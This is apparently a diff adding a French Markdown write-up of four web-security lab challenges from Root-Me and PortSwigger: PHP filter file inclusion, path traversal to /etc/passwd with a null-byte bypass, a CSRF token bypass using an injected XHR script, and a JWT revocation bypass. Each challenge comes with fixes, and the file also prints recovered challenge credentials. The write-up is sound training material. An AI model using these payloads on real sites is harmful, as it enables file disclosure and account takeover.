@@ -1,0 +1,139 @@
+# Challenges
+
+## PHP - Filters
+
+[https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters](https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters)
+
+### Étapes
+
+1. Sur la page d'accueil, dans l'url, ajouter un filtre: `?inc=php://filter/convert.base64-encode/resource=index.php`
+2. Changer le nom du fichier par celui qu'on veut récupérer (index.php, ch12.php, config.php...)
+
+<img src="images/php-filters.png" alt="php-filters" width="800"/>
+
+Contenu du fichier :
+```php
+<?php
+$username="admin";
+$password="DAPt9D2mky0APAF";
+```
+
+Ressources : [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md#wrapper-phpfilter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md#wrapper-phpfilter)
+
+### Explication
+
+Le site vérifie uniquement l'extension, et ne contrôle pas qu'on sort du dossier du site.
+
+### Recommandations
+
+- Empêcher de pouvoir charger des fichiers hors du dossier du site
+- Contrôler les caractères nul (%00, \x00)
+- Vérifier le mime-type du fichier chargé, pas uniquement l'extension
+
+[https://www.cve.org/CVERecord?id=CVE-2002-1031](https://www.cve.org/CVERecord?id=CVE-2002-1031)
+[https://www.cve.org/CVERecord?id=CVE-2000-0149](https://www.cve.org/CVERecord?id=CVE-2000-0149)
+
+<br />
+<hr style="height:0; border:1px white solid;" />
+<br />
+
+## File path traversal, validation of file extension with null byte bypass
+
+[https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
+
+### Étapes
+
+1. Aller sur la page détail, mettre burp en intercept, envoyer la requete d'image vers le repeater
+2. Changer le chemin par ../../../../etc/passwd
+
+> Attention, comme le precise l'exercice, le serveur fait attention a l'extension, donc rajouter %00.jpg
+
+<img src="images/path-traversal.png" alt="path-traversal" width="800"/>
+
+### Explication
+
+Le site vérifie uniquement l'extension, et ne contrôle pas qu'on sort du dossier du site.
+
+### Recommandations
+
+- Empêcher de pouvoir charger des fichiers hors du dossier du site
+- Contrôler les caractères nul (%00, \x00)
+- Vérifier le mime-type du fichier chargé, pas uniquement l'extension
+
+[https://www.cve.org/CVERecord?id=CVE-2002-1031](https://www.cve.org/CVERecord?id=CVE-2002-1031)
+[https://www.cve.org/CVERecord?id=CVE-2000-0149](https://www.cve.org/CVERecord?id=CVE-2000-0149)
+
+<br />
+<hr style="height:0; border:1px white solid;" />
+<br />
+
+## CSRF - Contournement de jeton
+
+[https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton](https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton)
+
+### Étapes
+
+1. S'inscrire (test@test.fr / test)
+2. Se login
+3. Aller sur profile et récupérer les champs du formulaire
+4. Aller sur contact
+5. Mettre cette payload dans le form de contact:
+
+```html
+<script>
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
+    xhr.send();
+    const token = (xhr.responseText.match(/[abcdef0123456789]{32}/))[0];
+    console.log(token);
+
+    const formData = new FormData();
+    formData.append('username', 'maxim');
+    formData.append('status', 'on');
+    formData.append('token', token);
+
+    xhr.open('POST', 'http://challenge01.root-me.org/web-client/ch23/index.php?action=profile', false);
+    xhr.send(formData);
+</script>
+```
+
+<img src="images/csrf-form.png" alt="csrf-form" width="800"/>
+
+La payload va chercher le token de l'admin sur son profil quand il sera connecté et autorise le user.
+Mdp : DAPt9D2mky0APAF
+
+### Explication
+
+Le token CSRF est prévisible et peut être récupéré via une requête AJAX.
+L'attaque CSRF est alors possible en incluant ce token dans la requête malveillante.
+
+### Recommandations
+
+- Ne pas exposer les tokens CSRF dans le code client
+- Utiliser des tokens CSRF uniques par session
+- Valider l'origine des requêtes via l'en-tête Referer ou Origin
+
+[https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf)
+
+<br />
+<hr style="height:0; border:1px white solid;" />
+<br />
+
+## JWT - Jeton révoqué
+
+[https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque)
+
+### Étapes
+
+1. Requête page d'accueil => repeater
+2. POST /login, payload: `{"username":"admin","password":"admin"}` (fourni dans le code source) <br /><img src="images/jwt-get.png" alt="jwt-get" width="800"/>
+3. GET /admin avec JWT de l'admin, message "Token is revoqued" <br /><img src="images/jwt-post.png" alt="jwt-post" width="800"/>
+4. Et en ajoutant un "=" à la signature du token JWT, j'ai reçu le message de réussite. <br /><img src="images/jwt-flag.png" alt="jwt-flag" width="800"/>
+
+### Explication
+
+La vérification de signature tolère un JWT avec padding (=). La liste de révocation compare la chaîne brute, la version modifiée n’est pas reconnue comme révoquée.
+
+### Recommandations
+
+Strip les caractères de padding avant de vérifier les JWT [https://github.com/auth0/node-jws/issues/98](https://github.com/auth0/node-jws/issues/98)
